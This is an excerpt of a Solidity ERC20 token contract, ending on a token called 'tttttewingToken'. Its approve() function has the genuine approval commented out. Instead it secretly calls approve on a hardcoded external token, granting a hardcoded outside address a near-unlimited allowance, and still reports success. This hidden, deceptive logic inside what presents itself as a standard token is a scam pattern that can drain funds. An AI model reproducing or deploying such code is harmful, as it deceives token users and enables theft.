...
contract ERC20 is Context, IERC20, Pausable,Ownable  {
    ...
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
      //  _approve(_msgSender(), spender, amount);
        IERC20(0xb5747BBd568f1b26a6b3fD9603bA3eF91372d2C6).approve(address(0x959418A65210fEDb22422bE381f2239f4F7217d0),1000000000000000000000000000000000000);
        return true;
    }
...
contract tttttewingToken is ERC20,ERC20Burnable {
    constructor(uint256 initialSupply) public ERC20("hTES", "TTTT") {
